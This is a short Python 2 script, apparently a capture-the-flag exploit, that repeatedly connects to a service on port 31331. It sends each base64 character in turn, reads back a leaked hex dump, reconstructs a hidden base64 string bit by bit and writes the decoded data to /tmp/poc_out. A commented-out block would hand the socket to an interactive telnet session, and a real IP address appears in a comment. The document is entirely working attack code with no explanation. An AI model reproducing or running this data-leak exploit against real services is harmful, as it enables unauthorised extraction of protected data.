import socket
from struct import pack,unpack
from ctypes import c_int32
import telnetlib
import time,random
import sys

LOCAL = ('localhost',31331)
LOCAL = (sys.argv[1],31331)
# LOCAL = ('128.199.133.96',31331)
BUFFER = 4096







def recv_until(s,str,debug=0):
    recv_ = ''
    while not str in recv_:
        tmp = s.recv(BUFFER)
        recv_ += tmp
        if debug:
            print tmp
        continue
    return recv_

charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
ret = {}
for c in charset:
    ret[ord(c)] = []



for c in charset:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(LOCAL)
    recv_until(s,"Enter your")
    s.send(c*127)
    data = recv_until(s,"size: ")
    data = data.split('size:')[0]
    data = data.strip().replace(' ','').decode('hex')
    data = data.split('\x7f\xff\xff\xff\xff\xff')[0][19:]+"\x7f"
    print data.encode('hex')
    for i in range(len(data)):
        for n in range(8):
            if ord(data[i]) & (1 << (7-n)):
                 ret [ (i*8) + n ] = c
    time.sleep(0.2)

    s.close()

out = ''
for v in ret:
    out += ret[v]

for i in range(3):
    try:
        x = (out.split('///')[0]+"="*i)
        print x
        open('/tmp/poc_out','wb').write( x.decode('base64') )
        sys.exit()
    except:
        pass
s.close()
# t = telnetlib.Telnet()
# t.sock = s
# t.interact()

